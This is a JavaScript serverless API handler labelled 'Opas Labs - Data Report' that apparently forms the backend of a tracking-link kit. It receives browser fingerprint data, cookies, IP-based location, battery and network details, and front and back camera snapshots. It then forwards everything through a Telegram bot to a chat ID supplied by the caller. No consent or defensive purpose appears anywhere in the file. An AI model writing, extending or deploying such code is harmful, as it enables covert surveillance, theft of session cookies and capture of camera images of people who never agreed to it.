export default async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, ...collectedData } = req.body;

    // Process and format the collected data
    const messageParts = [];
    
    // Header
    messageParts.push(
      `🔰 *Opas Labs - Data Report* 🔰`,
      `🆔 Chat ID: ${telegramId}`,
      `🕒 Time: ${new Date().toLocaleString()}`
    );

    // Basic Info
    if (collectedData.browser || collectedData.platform) {
      messageParts.push(`\n🌐 *Basic Info*`);
      if (collectedData.browser) messageParts.push(`- Browser: ${collectedData.browser}`);
      if (collectedData.platform) messageParts.push(`- Platform: ${collectedData.platform}`);
      if (collectedData.language) messageParts.push(`- Language: ${collectedData.language}`);
      if (collectedData.timezone) messageParts.push(`- Timezone: ${collectedData.timezone}`);
      if (collectedData.cookies) messageParts.push(`- Cookies: ${collectedData.cookies}`);
    }

    // Hardware Info
    if (collectedData.cpu || collectedData.memory || collectedData.screen) {
      messageParts.push(`\n💻 *Hardware*`);
      if (collectedData.cpu) messageParts.push(`- CPU: ${collectedData.cpu}`);
      if (collectedData.memory) messageParts.push(`- RAM: ${collectedData.memory}`);
      if (collectedData.screen) messageParts.push(`- Screen: ${collectedData.screen}`);
      if (collectedData.touch) messageParts.push(`- Touch: ${collectedData.touch}`);
      if (collectedData.webgl) {
        messageParts.push(`- WebGL: ${collectedData.webgl.vendor || 'Unknown'} | ${collectedData.webgl.renderer || 'Unknown'}`);
      }
    }

    // Network Info
    if (collectedData.network) {
      messageParts.push(`\n📶 *Network*`);
      if (collectedData.network.type) messageParts.push(`- Type: ${collectedData.network.type}`);
      if (collectedData.network.effectiveType) messageParts.push(`- Speed: ${collectedData.network.effectiveType}`);
      if (collectedData.network.downlink) messageParts.push(`- Downlink: ${collectedData.network.downlink} Mbps`);
      if (collectedData.network.rtt) messageParts.push(`- Latency: ${collectedData.network.rtt} ms`);
      if (collectedData.network.saveData !== undefined) {
        messageParts.push(`- Data Saver: ${collectedData.network.saveData ? 'Enabled' : 'Disabled'}`);
      }
    }

    // Location Info
    if (collectedData.ip || collectedData.city) {
      messageParts.push(`\n📍 *Approximate Location*`);
      if (collectedData.ip) messageParts.push(`- IP: ${collectedData.ip}`);
      if (collectedData.city) messageParts.push(`- City: ${collectedData.city}`);
      if (collectedData.region) messageParts.push(`- Region: ${collectedData.region}`);
      if (collectedData.country) messageParts.push(`- Country: ${collectedData.country}`);
    }

    // Battery Info
    if (collectedData.battery || collectedData.charging !== undefined) {
      messageParts.push(`\n🔋 *Battery*`);
      if (collectedData.battery) messageParts.push(`- Level: ${collectedData.battery}`);
      if (collectedData.charging !== undefined) {
        messageParts.push(`- Charging: ${collectedData.charging ? 'Yes' : 'No'}`);
      }
    }

    // Camera Status
    if (collectedData.cameraStatus) {
      messageParts.push(`\n📷 *Camera Status*`);
      messageParts.push(`- ${collectedData.cameraStatus}`);
    }

    // Join all message parts
    const messageText = messageParts.join('\n');

    // Send text data to Telegram
    const textResponse = await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: telegramId,
          text: messageText,
          parse_mode: 'Markdown'
        })
      }
    );

    if (!textResponse.ok) {
      throw new Error('Failed to send text to Telegram');
    }

    // Handle photo uploads if they exist
    if (collectedData.frontSnap || collectedData.backSnap) {
      const photoUploads = [];
      
      if (collectedData.frontSnap) {
        photoUploads.push(
          sendPhotoToTelegram(
            collectedData.frontSnap, 
            telegramId, 
            "📷 Front Camera Snapshot"
          )
        );
      }
      
      if (collectedData.backSnap) {
        photoUploads.push(
          sendPhotoToTelegram(
            collectedData.backSnap, 
            telegramId, 
            "📷 Back Camera Snapshot"
          )
        );
      }
      
      await Promise.all(photoUploads);
    }

    res.status(200).json({ success: true });

  } catch (error) {
    console.error('Error processing submission:', error);
    res.status(500).json({ 
      error: 'Failed to process data',
      details: error.message 
    });
  }
};

async function sendPhotoToTelegram(base64Image, chatId, caption) {
  try {
    // Convert base64 to blob
    const blob = await fetch(base64Image).then(res => res.blob());
    
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'snapshot.jpg');
    formData.append('caption', caption);

    const response = await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendPhoto`,
      {
        method: 'POST',
        body: formData
      }
    );

    if (!response.ok) {
      throw new Error('Failed to send photo to Telegram');
    }

    return response.json();
  } catch (error) {
    console.error('Error sending photo:', error);
    throw error;
  }
}
